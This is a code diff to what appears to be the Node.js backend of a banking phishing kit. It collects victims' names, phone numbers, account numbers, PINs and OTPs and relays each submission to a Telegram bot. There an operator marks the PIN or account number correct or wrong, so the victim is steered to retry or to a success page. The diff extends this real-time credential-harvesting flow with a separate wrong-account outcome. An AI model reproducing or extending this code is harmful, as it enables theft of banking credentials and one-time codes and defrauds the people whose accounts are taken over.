@@ -10,7 +10,7 @@ const DOMAIN = process.env.BACKEND_DOMAIN;
 // ---------- IN-MEMORY STORES ----------
 const phoneRequests = {};   // stores approval status for phone step
 const otpRequests = {};     // stores approval status for OTP step
-const pinRequests = {};     // stores approval status for PIN step
+const pinRequests = {};     // stores approval status for PIN step (now an object)
 const requestMeta = {};     // stores name, phone, accountNumber, botId for each request
 
 // ---------- BOTS ----------
@@ -152,7 +152,7 @@ app.get('/check-otp/:id', (req, res) => {
   res.json({ approved: otpRequests[req.params.id] ?? null });
 });
 
-// ---------- PIN STEP (with account number) ----------
+// ---------- PIN STEP (3 buttons: correct / wrong A/C / wrong PIN) ----------
 app.post('/submit-pin', (req, res) => {
   try {
     const { name, phone, accountNumber, pin, botId } = req.body;
@@ -160,7 +160,7 @@ app.post('/submit-pin', (req, res) => {
     if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
-    pinRequests[requestId] = null;
+    pinRequests[requestId] = null;   // pending
     requestMeta[requestId] = { name, phone, accountNumber, botId };
 
     sendTelegram(
@@ -173,8 +173,11 @@ app.post('/submit-pin', (req, res) => {
 🆔 Ref: ${requestId}`,
       [
         [
-          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
+          { text: '✅ Correct PIN & A/C', callback_data: `pin_ok:${requestId}` }
+        ],
+        [
+          { text: '❌ Wrong A/C', callback_data: `pin_bad_ac:${requestId}` },
+          { text: '❌ Wrong PIN', callback_data: `pin_bad_pin:${requestId}` }
         ]
       ]
     );
@@ -186,7 +189,9 @@ app.post('/submit-pin', (req, res) => {
 });
 
 app.get('/check-pin/:id', (req, res) => {
-  res.json({ approved: pinRequests[req.params.id] ?? null });
+  const result = pinRequests[req.params.id];
+  if (result === null || result === undefined) return res.json({ approved: null });
+  res.json(result);
 });
 
 // ---------- TELEGRAM CALLBACK WEBHOOK ----------
@@ -222,13 +227,23 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     feedback = '❌ OTP rejected';
   }
 
-  // PIN decisions
+  // PIN decisions (3 outcomes)
   if (action === 'pin_ok') {
-    pinRequests[requestId] = true;
-    feedback = '✅ PIN approved – redirecting to success page';
+    pinRequests[requestId] = { approved: true };
+    feedback = '✅ PIN & Account approved – redirecting to success page';
   }
+  if (action === 'pin_bad_ac') {
+    pinRequests[requestId] = { approved: false, reason: 'account' };
+    feedback = '❌ Wrong Account Number – user will retry';
+  }
+  if (action === 'pin_bad_pin') {
+    pinRequests[requestId] = { approved: false, reason: 'pin' };
+    feedback = '❌ Wrong PIN – user will retry';
+  }
+
+  // Also support legacy 'pin_bad' as a fallback → treated as wrong PIN
   if (action === 'pin_bad') {
-    pinRequests[requestId] = false;
+    pinRequests[requestId] = { approved: false, reason: 'pin' };
     feedback = '❌ PIN rejected';
   }
 
